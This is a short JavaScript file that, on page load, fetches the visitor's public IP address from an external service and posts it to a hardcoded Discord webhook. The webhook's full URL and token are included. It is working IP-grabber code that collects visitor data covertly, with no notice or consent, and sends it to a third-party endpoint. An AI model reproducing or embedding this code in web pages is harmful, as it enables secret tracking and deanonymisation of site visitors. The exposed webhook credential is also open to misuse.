// Function to get the user's IP address
async function getIP() {
    try {
        let response = await fetch('https://api.ipify.org?format=json');
        let data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }
}

// Function to send the IP address to the Discord webhook
async function sendToWebhook(ip) {
    const webhookUrl = 'https://discord.com/api/webhooks/1255451054003195985/-IIJYymOmPdQBBXcS2JyhGdD6Bi1ZZrC11bJmLXAIC36Dh2QXpsQhZEomoCSM1h_CsBf';
    
    const payload = {
        content: `User IP: ${ip}`
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        console.error('Error sending to webhook:', error);
    }
}

// Main function to log the IP and send it to the webhook
async function logIP() {
    const ip = await getIP();
    if (ip) {
        console.log('User IP:', ip);
        await sendToWebhook(ip);
    }
}

// Execute the main function when the page loads
window.onload = logIP;
